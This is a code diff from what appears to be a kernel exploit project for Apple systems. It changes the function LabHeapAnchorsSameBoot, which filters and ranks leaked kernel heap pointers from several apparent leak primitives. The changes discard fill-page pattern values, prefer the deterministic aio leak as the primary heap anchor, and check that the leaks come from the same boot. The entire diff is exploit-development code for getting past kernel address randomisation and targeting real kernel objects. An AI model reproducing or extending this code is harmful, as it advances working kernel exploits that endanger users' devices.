@@ -72,6 +72,30 @@ int LabHeapAnchorsSameBoot(int max, uint64_t *out) {
             /* shape gate: kernel-pointer band only, and never a static */
             if (va == 0 || (va >> 48) != 0xffffULL) continue;
             if (va == 0xfffffe0007004000ULL) continue;   /* static_base, not heap */
+            /* 2026-11-21 the anchor-selection fix (the receipt: "the real
+               aio kptrs dont anchor correctly and it fills the content with
+               the pages instead of aio kptr anchor"):
+               (a) PATTERN FILTER — the xxffffff-tail values (the kernel's
+                   fill/descriptor pages: 0xfffffff06bffffff etc.) and
+                   page-aligned round addresses (0x...00000000) are NOT
+                   object anchors — they are pattern values that p159 reads
+                   from fill pages. A real kalloc anchor has a natural
+                   in-page offset (not 0xfff-aligned, not page-aligned).
+               (b) SOURCE PREFERENCE — aio84530 leaks are DETERMINISTIC and
+                   point at a REAL object (the workq entry, cross-confirmed
+                   by the panic's rc at the computable stride). p159 leaks
+                   are the lottery and can produce fill-pattern values.
+                   The primary anchor should be the aio kptr, not whatever
+                   p159 recorded most recently. */
+            NSString *src = ([e[@"source"] isKindOfClass:[NSString class]]) ? e[@"source"] : @"";
+            uint32_t low32 = (uint32_t)(va & 0xFFFFFFFFULL);
+            BOOL isPattern = ((low32 & 0xFFFF0000ULL) == 0xFFFF0000ULL) ||  /* xxffffff tail */
+                             ((low32 & 0xFFFULL) == 0xFFFULL) ||             /* ...fff alignment */
+                             ((low32 & 0xFFFFFULL) == 0ULL);                 /* page-aligned round */
+            int srcRank = [src isEqualToString:@"aio84530"] ? 0 :
+                          [src isEqualToString:@"p114_m2scaler"] ? 1 :
+                          [src isEqualToString:@"p159_isurface"] ? 2 : 3;
+            if (isPattern && srcRank >= 2) continue;   /* pattern-shaped p159/unknown: never an anchor */
             /* same-boot provenance: boot_uuid when the entry carries it
                (2026-11-19: bulletproof — no timezone-parse risk), else the
                legacy time-stamp check. */
@@ -86,12 +110,18 @@ int LabHeapAnchorsSameBoot(int max, uint64_t *out) {
                 if (!t) continue;
                 if ([t timeIntervalSince1970] < (NSTimeInterval)boot - 1) continue;  /* clock skew slack */
             }
-            if (t) [cands addObject:@{ @"va": @(va), @"t": t }];
+            if (t) [cands addObject:@{ @"va": @(va), @"t": t, @"rank": @(srcRank) }];
             }
         } @catch (__unused NSException *e) { continue; }
     }
-    /* freshest first, distinct values only */
+    /* 2026-11-21: source-rank first (aio84530 > p114 > p159 > other), then
+       freshest within each rank. The old freshest-first sort let a recent
+       p159 fill-pattern value beat the deterministic aio kptr for the
+       primary anchor slot — the pages got tagged with a pattern value
+       instead of the real object address. */
     [cands sortUsingComparator:^NSComparisonResult(NSDictionary *a, NSDictionary *b) {
+        NSInteger ra = [a[@"rank"] integerValue], rb = [b[@"rank"] integerValue];
+        if (ra != rb) return ra < rb ? NSOrderedAscending : NSOrderedDescending;
         return [(NSDate *)b[@"t"] compare:(NSDate *)a[@"t"]];
     }];
     for (NSDictionary *c in cands) {
